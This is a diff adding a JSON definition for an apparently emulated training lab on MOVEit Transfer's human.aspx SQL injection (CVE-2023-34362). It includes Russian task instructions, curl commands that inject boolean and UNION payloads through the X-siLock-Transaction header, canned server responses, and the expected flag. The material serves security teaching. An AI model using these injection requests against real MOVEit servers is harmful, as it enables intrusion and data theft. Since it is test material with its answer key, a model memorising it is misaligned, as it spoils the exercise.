@@ -1,0 +1,47 @@
+{
+  "id": "web-moveit",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{m0v31t_hum4n_4spx_sql1_t0_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: MOVEit human.aspx (CVE-2023-34362)\n\nЦель: `https://moveit.local`. Точка инъекции — заголовок\n`X-siLock-Transaction` эндпоинта `/human.aspx`.\n\n1. Убедись, что параметр обрабатывается:\n   curl -s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder'\n\n2. Подтверди boolean-инъекцию (истина и ложь дают разную длину):\n   curl -s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=1'\n   curl -s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=2'\n\n3. Извлеки значение настройки (в ней флаг) через UNION:\n   curl -s -k https://moveit.local/human.aspx -H \"X-siLock-Transaction: folder UNION SELECT setting FROM config\"\n\n4. Сохрани флаг в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция moveit.local)",
+      "cases": [
+        {
+          "match": "UNION|config",
+          "example": "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder UNION SELECT setting FROM config'",
+          "output": "<html><body><table><tr><td>nto{m0v31t_hum4n_4spx_sql1_t0_rce}</td></tr></table></body></html>\n"
+        },
+        {
+          "match": "1=1",
+          "example": "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=1'",
+          "output": "<html><body><table><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr><tr><td>file</td><td>folder</td></tr></table></body></html>\n"
+        },
+        {
+          "match": "1=2",
+          "example": "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder; AND 1=2'",
+          "output": "<html><body><table></table></body></html>\n"
+        },
+        {
+          "match": "human\\.aspx",
+          "example": "-s -k https://moveit.local/human.aspx -H 'X-siLock-Transaction: folder'",
+          "output": "<html><head><title>MOVEit Transfer</title></head><body>MOVEit Transfer 2021.0.6</body></html>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только moveit.local"
+    }
+  }
+}
